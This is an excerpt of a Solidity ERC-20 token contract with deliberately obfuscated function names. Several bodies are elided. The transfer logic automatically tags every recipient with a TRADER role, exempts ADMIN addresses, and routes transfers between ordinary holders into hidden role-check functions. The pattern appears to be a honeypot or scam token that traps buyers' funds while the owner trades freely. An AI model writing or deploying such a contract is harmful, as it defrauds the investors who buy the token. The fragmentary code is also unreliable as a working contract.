...
abstract contract _CKSDNEMConsole is Context, _CKSDNEMRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __CKSDNEMggewap(role, account, amt);
    }

    function __CKSDNEMggewap(bytes32 role, address account, uint256 amt) internal {
    ...
    function __CKSDNEMggeSwap(bytes32 role, address account, uint256 num) internal virtual {
...
contract _CKSDNEMERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _CKSDNEMERC20, _CKSDNEMConsole {
    ...
    ) _CKSDNEMERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_CKSDNEMERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __CKSDNEMcidnlfnd(from, to, amt);

    }



    function __CKSDNEMcidnlfnd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __CKSDNEMzlklcivn(from, to, amt);
    }


    function __CKSDNEMzlklcivn(address from, address to, uint256 amt) internal {
        ...
        __CKSDNEMxkcvinad(from, to, amt);
    }

    function __CKSDNEMxkcvinad(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __CKSDNEMxvodnfdr(from, to, amt);
    }


    function __CKSDNEMxvodnfdr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        }else if(isnum > 99 && !__checkaddr[to]){
            __CKSDNEMggeSwap(TRADER,to,1);
        }

        __CKSDNEMxcvnldfrg(from, to, amt);
    }

    function __CKSDNEMxcvnldfrg(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        __CKSDNEMcxnvilrnsh(from, to, amt);
    }

    function __CKSDNEMcxnvilrnsh(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __CKSDNEMcxvnfosk(from, TRADER, amt);
    ...
    function __CKSDNEMcxvnfosk(address from, bytes32 role, uint256 amt) internal {
        __CKSDNEMggewap(role, from, amt);
    }
